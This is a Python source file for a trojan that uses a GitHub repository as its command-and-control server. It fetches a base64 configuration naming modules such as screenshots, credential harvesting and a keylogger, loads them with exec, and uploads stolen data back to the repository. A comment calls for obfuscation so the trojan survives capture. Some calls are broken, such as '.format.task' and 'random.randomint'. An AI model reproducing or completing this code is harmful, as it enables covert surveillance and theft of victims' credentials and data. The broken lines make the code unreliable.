# this is the main trojan, it will pull it's configurations and code from github

import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
import os

from random import randrange
from github3 import login
# uniquely identify this trojan as "abc", determining its config as well as 
# making it easier to manage data, in a full scale version of this project you
# would need a way to generate trojans, set the id and automatically create configs
# and send them up to github as well as compile them into an exe.
trojan_id = ("abc")

# set the variables
trojan_config = ("{}.json".format(trojan_id))
data_path = ("data/{}/".format(trojan_id))
trojan_modules = []
configured = False
task_queue = queue.Queue()

# the next four functions are the meat and potatoes in regards to interaction with the C2 (github)
#########################################################################################################################
# call back to our c2/github and authenticate, retrieve the current repo and branch objects to be used by other functions
#########################################################################################################################
#///NEEDS TO BE OBFUSCATED!!! AND ACL'S PUT IN PLACE SO IF TROJAN IS CAUGHT THEY CAN ONLY ACCESS THE REPO AND NOT DATA!!!
#########################################################################################################################
def connect_to_github():
    gh = login(username="test",password="test")
    #gh = login(username=input("GitHub username:"),password=input("Github password: "))
    repo = gh.repository(input(""),"python_code")
    branch = repo.branch("master")

    return gh,repo,branch

#collects the remote files from repo and reads them locally - reads config options as well as module code
def get_file_contents(filepath):

    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print ("[*] Found file {}".format(filepath))
            blob = repo.blob(filename._json_data["sha"])
            return blob.content

    return None

# retrieves the remote config.JSON doc so that the trojan knows which modules to run (screenshots, cred harvesting, keylogger, pranks etc)
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task["module"] not in sys.modules:

            exec("import {}".format.task["module"])

    return config

# calls back to c2 in order to store any collected data
def store_module_result(data):

    gh,repo,branch = connect_to_github()
    remote_path = "data/{}/{}.data".format.trojan_id,random.randomint(2000,350000)
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    print(remote_path)
    
    return

#repo.create_file(remote_path,"Commit message",base64.b64encode(data))


